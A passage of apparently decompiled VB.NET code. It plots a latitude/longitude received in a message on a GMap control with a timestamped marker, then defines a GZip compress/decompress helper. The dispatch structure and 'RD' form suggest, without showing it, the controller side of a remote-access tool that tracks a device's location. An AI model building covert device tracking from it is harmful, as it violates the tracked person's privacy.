                        RD.ToolStripStatusLabel1.ForeColor = Color.Green
                        RD.ToolStripStatusLabel1.Text = A(2)

                        Try
                            RD.GMapControl1.MapProvider = GMapProviders.GoogleMap
                            RD.GMapControl1.DragButton = MouseButtons.Left
                            RD.GMapControl1.Position = New PointLatLng(A(2).Split(",")(0), A(2).Split(",")(1))
                            Dim markerOverlay As New GMapOverlay()
                            Dim marker = New GMarkerGoogle(New PointLatLng(A(2).Split(",")(0), A(2).Split(",")(1)), GMarkerGoogleType.blue)
                            marker.ToolTipText = String.Format("Location : " + DateTime.Now.ToLongTimeString())
                            RD.GMapControl1.Overlays.Add(markerOverlay)
                            markerOverlay.Markers.Add(marker)
                            marker.ToolTipMode = MarkerTooltipMode.Always
                        Catch ex As Exception
                            Debug.WriteLine(ex.Message)
                        End Try


                    End If
                    Exit Sub

            End Select
            Exit Sub
        Catch ex As Exception
            Debug.WriteLine("Messages" + ex.Message)
        End Try
    End Sub
    Public Shared Function smethod_5(byte_0 As Byte(), ByRef bool_0 As Boolean) As Byte()
        If bool_0 Then
            Dim memoryStream As MemoryStream = New MemoryStream()
            Dim gZipStream As GZipStream = New GZipStream(memoryStream, CompressionMode.Compress, True)
            gZipStream.Write(byte_0, 0, byte_0.Length)
            gZipStream.Dispose()
            memoryStream.Position = 0L
            Dim array As Byte() = New Byte(CInt(memoryStream.Length) + 1 - 1) {}
            memoryStream.Read(array, 0, array.Length)
            memoryStream.Dispose()
            Return array
        End If
        Dim memoryStream2 As MemoryStream = New MemoryStream(byte_0)
        Dim gZipStream2 As GZipStream = New GZipStream(memoryStream2, CompressionMode.Decompress)
        Dim array2 As Byte() = New Byte(3) {}
        memoryStream2.Position = memoryStream2.Length - 5L
        memoryStream2.Read(array2, 0, 4)
        Dim num As Integer = BitConverter.ToInt32(array2, 0)
        memoryStream2.Position = 0L
        Dim array3 As Byte() = New Byte(num - 1 + 1 - 1) {}
        gZipStream2.Read(array3, 0, num)
        gZipStream2.Dispose()
        memoryStream2.Dispose()
        Return array3
    End Function

End Class
